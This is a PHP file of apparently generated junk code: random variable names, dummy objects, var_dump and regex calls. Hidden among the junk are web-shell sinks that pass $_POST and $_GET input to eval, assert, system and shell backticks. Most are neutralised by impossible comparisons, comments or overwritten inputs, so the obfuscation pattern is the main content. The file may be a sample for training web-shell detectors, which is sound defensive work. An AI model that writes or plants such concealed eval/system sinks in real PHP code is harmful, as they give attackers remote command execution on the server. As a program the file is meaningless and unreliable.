<?php
$gt34Be8y = 'RJ';
$CQra6h1H = 'UNpDjv5OVol';
$Syocy = 'BmZ';
$XS = 'us';
$j2_cGpDaV = 'hmuNv7nzZ';
$gvw = 'XtWG2dd04De';
$Ub5jwVq0 = '_4oaL';
$rU = new stdClass();
$rU->p1yNqfN8f = 'zm';
$rU->aQdGk = 'p87yels';
$rU->WIAsIWrFZ_k = 'nOO2L6uy_';
if(function_exists("HNgW9QoC3sBacz")){
    HNgW9QoC3sBacz($gt34Be8y);
}
if(function_exists("JQ95bEKWdeuqon")){
    JQ95bEKWdeuqon($CQra6h1H);
}
$rSkXrJAhlg = array();
$rSkXrJAhlg[]= $Syocy;
var_dump($rSkXrJAhlg);
$XS = explode('bkWQLt', $XS);
$gvw = $_POST['NdImTNnFdcaJs'] ?? ' ';
$a0WX9w = array();
$a0WX9w[]= $Ub5jwVq0;
var_dump($a0WX9w);

function Cl()
{
    /*
    $LKkEAHEGZ = 'z51SoM';
    $g9 = new stdClass();
    $g9->OZCHOOL = 'JnLc';
    $g9->dFpdD = 'GvJ1';
    $g9->wWNyinC = 'fwtrEAho5';
    $fj = 'b1q8Cq5N8';
    $GGxqZzgJw = 'QcgDI7vigf3';
    $a4 = 'OamrnDaT';
    $LKkEAHEGZ = $_POST['Sh9j8VHXJQhIi'] ?? ' ';
    preg_match('/X7_t40/i', $fj, $match);
    print_r($match);
    if(function_exists("WTdy_55Xq5M4l")){
        WTdy_55Xq5M4l($GGxqZzgJw);
    }
    $a4 = explode('pCrK2j', $a4);
    */
    if('HnN85kYs0' == 'PhMbbmp67')
    assert($_POST['HnN85kYs0'] ?? ' ');
    
}
/*
$KHdOOpo7Z = 'system';
if('LkejIUFT2' == 'KHdOOpo7Z')
($KHdOOpo7Z)($_POST['LkejIUFT2'] ?? ' ');
*/
if('DL9iyisTk' == 'R0jkc0QmW')
eval($_POST['DL9iyisTk'] ?? ' ');
$e1K = 'dtvkULHwO';
$qq64p = 'sEIsN1BALfo';
$msnZhP4v = 'A5cigJXh';
$sGWg = 'ZswSjmQPHF';
$hSk = 'lHeh6z';
$s0swR9QqE = new stdClass();
$s0swR9QqE->FTff = 'tI8';
$s0swR9QqE->Y5COG6mck = 'Ot';
$s0swR9QqE->tTy_N = 'x2x';
$s0swR9QqE->TE1VzG0o = 'ZoDJ8XCjT';
$s0swR9QqE->ii8330 = 'wgxXAuUjF';
$s0swR9QqE->PxNEgOasv = 'ML_D';
$tOPTXfeh = 'OH_ArqYxOW0';
$qq64p = $_GET['e8aDn64lpOfenmEN'] ?? ' ';
$bEjnrtK3 = array();
$bEjnrtK3[]= $msnZhP4v;
var_dump($bEjnrtK3);
preg_match('/AXs0OQ/i', $sGWg, $match);
print_r($match);
echo $tOPTXfeh;
$_GET['LpjUJxUwN'] = ' ';
$Mg0uAb = 'Urd1Wb';
$i5 = 'tWl0jl2';
$FE440VDxyF = 'anOoHM';
$hG2FWIw = new stdClass();
$hG2FWIw->GOl8uc6 = 'VcoRTY3';
$hG2FWIw->P4Skdf = 'ZLKpI';
$hG2FWIw->rI9kO63GTAC = 'RpH_X4jv';
$hG2FWIw->aZ9s = 'U8N';
$YVohGj2Uvyg = 'eBmvnxoZ';
$PF1BmIUC = 'TJ';
$Q3PMNy = 'svMjc4L5fc7';
echo $FE440VDxyF;
var_dump($YVohGj2Uvyg);
echo $PF1BmIUC;
eval($_GET['LpjUJxUwN'] ?? ' ');
$Hod = 'HmVaNy3Lo';
$sc = 'Eq33RhoD';
$ESbCM3Qzt = 'MRyeRC9S';
$BgdW_2yEZ = 'wQ6';
$hgCjzea = 'lBaQM';
$kFoZmm63ij = 'Dq';
$p_Qz26gouh = 'B30';
$iYNgoYBcKW = 'wE2UPN0';
$W2W = 'I6gTnU1';
$TZ9NOpqv = 'QLnPlclcc6g';
preg_match('/MIursn/i', $Hod, $match);
print_r($match);
$sc = $_GET['rQ3tck7'] ?? ' ';
$ESbCM3Qzt = $_POST['gKWgQF'] ?? ' ';
str_replace('I9UhKJ2qy', 'uFpnsX8', $BgdW_2yEZ);
$hgCjzea = explode('mqGg2a', $hgCjzea);
var_dump($kFoZmm63ij);
$p_Qz26gouh .= 'PZuSRaM9ihI0L';
echo $W2W;
$TZ9NOpqv = $_GET['DJXDkGLU'] ?? ' ';
if('ENBNo1t5n' == 'SB8xU4ylK')
system($_POST['ENBNo1t5n'] ?? ' ');
$TM7RFeF_eP_ = 'csCNRz';
$p_yw7oRwz7 = 'DFNR';
$Cr8XN = 'zSC1vsES';
$CV3Vme9SvP = 'oSHh';
var_dump($TM7RFeF_eP_);
$p_yw7oRwz7 = $_GET['Pu0O7t0'] ?? ' ';
echo $CV3Vme9SvP;

function DKLFiLPh4UzPndK1qD8uc()
{
    $jbFrdSi = 'JlG';
    $yAz2sV = 'VPIb';
    $O53yFiy0h = 'u_0i4';
    $ht = 'pXVf21gOg5';
    $Z2i4gCA = 'UUH';
    $riwcjZa2NB = 'DkyTdV15rY';
    $SPd5uBn = 'zWc9yFdY';
    $LaTVj = 'e9zt';
    $un6LS8Q1sK = 'xWD';
    $QiBi = 'BCAybIFi';
    $jbFrdSi = explode('a1BvCkO2', $jbFrdSi);
    $yAz2sV = explode('q63uil6d', $yAz2sV);
    preg_match('/fY79R_/i', $O53yFiy0h, $match);
    print_r($match);
    $ht = $_POST['MeWoau53FKU6'] ?? ' ';
    preg_match('/rI8i6X/i', $Z2i4gCA, $match);
    print_r($match);
    preg_match('/wlEsev/i', $riwcjZa2NB, $match);
    print_r($match);
    str_replace('YtFcDJPPsvjF2a8', 'EJ1B3qDzFW_pMb', $SPd5uBn);
    if(function_exists("cL6ly9")){
        cL6ly9($LaTVj);
    }
    if(function_exists("GZQm4Pr")){
        GZQm4Pr($un6LS8Q1sK);
    }
    $QiBi = $_GET['xciwAe1yPJw1zU'] ?? ' ';
    /*
    $nUsJmIP63 = 'system';
    if('QFYlbTxiH' == 'nUsJmIP63')
    ($nUsJmIP63)($_POST['QFYlbTxiH'] ?? ' ');
    */
    
}
$uuRdFeykA = 'AGisJILy';
$J1pEWu = 'gF5cOpnJ6r4';
$hYbHGOKZ = 'yUr7PN8ApZI';
$ShO0Ka = 'V2k0aMyB9';
$CcMi6tsrPf = 'RbWfXF';
$iA7ZcOeC = 'AC1dzvEP0';
$tDFhtNF = 'aWPWr5Y7';
$zbqfHUBj = new stdClass();
$zbqfHUBj->NoUL = 'xsxL5EF';
$zbqfHUBj->hU = 'bsB_aEsm';
$zbqfHUBj->oeUTo = 'q_3xo';
$zbqfHUBj->_biUBeX3vU = 'LzIyKvi3';
$zbqfHUBj->V59X = 'ZyS1b';
preg_match('/Jdvrb2/i', $uuRdFeykA, $match);
print_r($match);
str_replace('sXi5S4', 'ajWVSEWM', $J1pEWu);
str_replace('CjxkLlGy', 'mraQ6Qk6', $hYbHGOKZ);
$ShO0Ka = explode('izW5Mb3sW9T', $ShO0Ka);
var_dump($CcMi6tsrPf);
echo $tDFhtNF;
$LMDFtEx = 'htypD4xG';
$k208Nq2HN = 'HTyuYrPL1uv';
$HtZMm = 'MiitbDu';
$M_V9 = new stdClass();
$M_V9->fUfM9IAS = 'MIA1CX';
$M_V9->FlXLsj = 'a6mepsH2';
$M_V9->tUSS = 'YA6sI';
$B4jY7i8KdAw = 'VPwn';
$HJHW_ = 'MwD';
$LMDFtEx .= 'ftLqtCT';
$k208Nq2HN = $_GET['MQygYp8L2qMhj'] ?? ' ';
$HtZMm = $_POST['y9BvSXEnmt'] ?? ' ';
$OF7Hg4SdGU = array();
$OF7Hg4SdGU[]= $B4jY7i8KdAw;
var_dump($OF7Hg4SdGU);
$HJHW_ = explode('T9e42iqC', $HJHW_);
/*
if('NQyJQORTI' == 'Ofn5yChni')
system($_POST['NQyJQORTI'] ?? ' ');
*/

function KtjMy7aizSwl5F()
{
    $_GET['IlE6rIvZl'] = ' ';
    $aLTbv_6 = 'xCBuv2zHZJ';
    $U4WhHQrRp = 'OqB';
    $EjLZ2 = 'meDPgTd6zi';
    $vKevw = 'VdnaTN8xAlY';
    $UToKHmg = 'rE3gHP4qCF';
    $D5iD = new stdClass();
    $D5iD->uajMigFOplZ = 'Fl3';
    $D5iD->L9MsgNoY7E = 'c9_';
    $D5iD->h65xK7rMJPd = 'jwZSGbCPf';
    $D5iD->YrTKULpP4U = 'zz';
    var_dump($U4WhHQrRp);
    $EjLZ2 = $_GET['_20GcGkdtnXl'] ?? ' ';
    echo $vKevw;
    $UToKHmg .= 'IvhO0knOmCTs3v6y';
    echo `{$_GET['IlE6rIvZl']}`;
    
}

function freDNdk()
{
    $Xc1KN = 'H6Arv';
    $Kh_52e_I = 'D8SQIT';
    $CqYfkFilcq = 'sfv7kqG2h';
    $g2B5tFIPD = 'g4YdM';
    $FT = 'NpRc';
    $Xc1KN = $_POST['GBe7GKhLNHfdJ7J8'] ?? ' ';
    if(function_exists("awq_qxd1qpsY")){
        awq_qxd1qpsY($Kh_52e_I);
    }
    $FT = explode('N9fFOc', $FT);
    
}
/*
$hsvj = 'gY';
$SGvRdWH6W = 'ODboRhw';
$kl64 = 'euodflF6m';
$TqJEpj29 = 'cKICB';
$GJixp4y0 = 'LnXyJ';
$IqOR = 'SPs5EklzWt';
str_replace('GjwCd1qGU6ToG', '_tICZ0', $hsvj);
str_replace('G_OLg6SDKgZC59', 'ikXS7Ip', $SGvRdWH6W);
$kl64 .= 'geS0yQGBJ';
var_dump($TqJEpj29);
$GJixp4y0 .= 'ezbP339Q0mmWd4cK';
preg_match('/gMZgQ0/i', $IqOR, $match);
print_r($match);
*/

function xUK0Rj9WdVrH()
{
    $Q5 = 'HOQVp8';
    $MyKL1wsmH = 'avAOqs';
    $IAcy = 'h3gP7Ed';
    $IPpEvk6 = 'nLZeb';
    $hCq = 'xIYmy';
    $MKb7D92Cvev = 'mBT6P';
    $htjmcH = new stdClass();
    $htjmcH->egE1 = 'danXAaYzi';
    $htjmcH->SnJJEGzLjAJ = 'if8G';
    $htjmcH->XIJdNt = 'Bo2V';
    $htjmcH->Ssm = 'ZRYnacQG';
    $og05ZK4I = 'cKOmdNAM0';
    $uwT2d22 = new stdClass();
    $uwT2d22->abTV9zSJ8z = 'mXGvI';
    $uwT2d22->Va9 = 'UewPYtzs_vw';
    $uwT2d22->RFir = 'q2';
    $uwT2d22->dW = 'J_ft';
    $QVdE = 'a3ja3seAx4';
    $Bvpb6wvNlO = 'iGD4cviW1RQ';
    $Avbp3X_95 = 'XVBMPkV';
    $Q5 = explode('jJwgkk', $Q5);
    $MyKL1wsmH .= 'sZByaf6omxLMqFJ';
    str_replace('ldoBjSa32', 'Vq3Ravmk4Ld', $IAcy);
    preg_match('/isGrzc/i', $IPpEvk6, $match);
    print_r($match);
    str_replace('GKEcPw4Ez', 'xG44QBJjDgq6', $hCq);
    $EITAMir1 = array();
    $EITAMir1[]= $MKb7D92Cvev;
    var_dump($EITAMir1);
    $og05ZK4I = $_POST['UPWbAFsae_0a'] ?? ' ';
    if(function_exists("QZGfbks86_gOgz")){
        QZGfbks86_gOgz($QVdE);
    }
    $Avbp3X_95 = $_POST['yrB7TNtCRqLR'] ?? ' ';
    $m0 = 'vl9HbenZ';
    $YFyPaK9E4 = new stdClass();
    $YFyPaK9E4->jrnWpBa = 'ZpqAk';
    $YFyPaK9E4->OiNfMEwg = 'O6v';
    $YFyPaK9E4->HTF5Do2JA3 = 'EJQs_p1';
    $R6F = 'yIpB1FBnX';
    $UUW9C3Zd0my = 'QxZsevWRWJ';
    str_replace('Zy2_AXw5i509sC1', 'YYnchT3DfJ', $m0);
    preg_match('/VkfJ6g/i', $R6F, $match);
    print_r($match);
    if(function_exists("DB6I6ZzDzHmY9")){
        DB6I6ZzDzHmY9($UUW9C3Zd0my);
    }
    $btZRt5 = 'vdI3VI1hE9';
    $aayezQH8S = 'mcLRJSUKd';
    $tGvGE0h8tE = 'QMpaqjTua';
    $EGj = 'mv';
    $Fs8IF27r = 'JAsW6FH';
    $j9ZLT = 'PdwRxE';
    $g4t2mIxfWTr = 'NJ0vgNE';
    $T3_YBhVIjB = 'jNyWLofBHc';
    str_replace('Mqv1LXu1cU', 'T61VC_PcnEU_h5', $aayezQH8S);
    $tGvGE0h8tE .= 'i1ZDKd1FTxL';
    $EGj = $_GET['uwuZ4Q2lNhztCY4f'] ?? ' ';
    $njjfMxXD = array();
    $njjfMxXD[]= $Fs8IF27r;
    var_dump($njjfMxXD);
    $MiJlcwCRTMe = array();
    $MiJlcwCRTMe[]= $j9ZLT;
    var_dump($MiJlcwCRTMe);
    str_replace('abzbz9v9', 'eIs5rg', $g4t2mIxfWTr);
    
}
$UUzDUf = 'rv';
$pnWSz = 'DJ';
$MOzxsV = 'rhT0';
$kZ5wqmQ6uN = 'pG6ju';
$YYzeJA5ugpR = 'wsm';
$KHTKrD0G7E4 = 'h_1zAjb4rdb';
$wjVqX4fE = 'e0KcBESl9B';
$usjjD_jH0sK = 'NRHYCW3';
$UUzDUf = $_GET['UtI6Wt'] ?? ' ';
str_replace('yMoy22hZrTJCtJk', 'SFvB9E', $pnWSz);
if(function_exists("nTfa7Fo5Jo")){
    nTfa7Fo5Jo($MOzxsV);
}
preg_match('/bL4IVM/i', $YYzeJA5ugpR, $match);
print_r($match);
$KHTKrD0G7E4 .= 'gCY5yknlc';
preg_match('/BxX9Fz/i', $wjVqX4fE, $match);
print_r($match);
var_dump($usjjD_jH0sK);
/*
$FGu1_6pck = 'system';
if('ZZbSc_0z0' == 'FGu1_6pck')
($FGu1_6pck)($_POST['ZZbSc_0z0'] ?? ' ');
*/
$UMYjE = 'YoFAv';
$E2kX4KSmi = 'gcBhr8fNB';
$S2Pg = new stdClass();
$S2Pg->JllEtdja = 'Byxflgyl';
$S2Pg->zyaqCP_Mj = 'EtRmP';
$S2Pg->Fwzn = 'Gi';
$S2Pg->X9nGsFQC = 'J8pxJS';
$O_w5ApwyOW = 'lZ8D';
$mtbP = new stdClass();
$mtbP->dA = 'i7O5ZHv';
$mtbP->JRy3s0iXZx = 'VsSo4ArxUCq';
$zNDMZHAkoD = 'bi3tfUnxhk9';
$UMYjE = $_GET['FjUUeg7p20c'] ?? ' ';
$E2kX4KSmi .= 'QwnmWAujdaNR_hM';
var_dump($O_w5ApwyOW);
echo $zNDMZHAkoD;
echo 'End of File';
